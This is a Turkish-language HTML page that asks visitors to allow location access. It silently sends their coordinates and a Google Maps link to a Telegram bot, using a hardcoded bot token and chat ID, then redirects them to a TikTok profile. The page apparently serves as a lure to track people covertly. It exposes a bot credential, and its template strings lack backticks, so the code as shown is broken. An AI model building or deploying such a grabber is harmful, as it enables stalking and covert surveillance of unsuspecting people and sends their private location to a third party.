<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Konum Gönderiliyor...</title>
</head>
<body>
  <h3>📍 Lütfen konum izni verin...</h3>
  <button onclick="getLocation()">Konumumu Gönder</button>

  <script>
    const botToken = "7906946385:AAE_qvqTw8qxZBkdktkQNrXDM7maV6bdKqA";
    const chatId = "6358000072";
    const redirectURL = "https://www.tiktok.com/@ilayda.yldrm84?_t=ZS-8yeSDvPtpDc&_r=1";

    function sendLocation(lat, lon) {
      fetch(https://api.telegram.org/bot${botToken}/sendMessage, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: 📍 Konum alındı:\nLatitude: ${lat}\nLongitude: ${lon}\nGoogle Maps: https://maps.google.com/?q=${lat},${lon}
        })
      }).then(() => {
        window.location.href = redirectURL;
      }).catch(() => {
        window.location.href = redirectURL;
      });
    }

    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            sendLocation(pos.coords.latitude, pos.coords.longitude);
          },
          err => {
            alert("Konum alınamadı: " + err.message);
            window.location.href = redirectURL;
          }
        );
      } else {
        alert("Tarayıcınız konum desteği vermiyor.");
        window.location.href = redirectURL;
      }
    }
  </script>
</body>
</html>
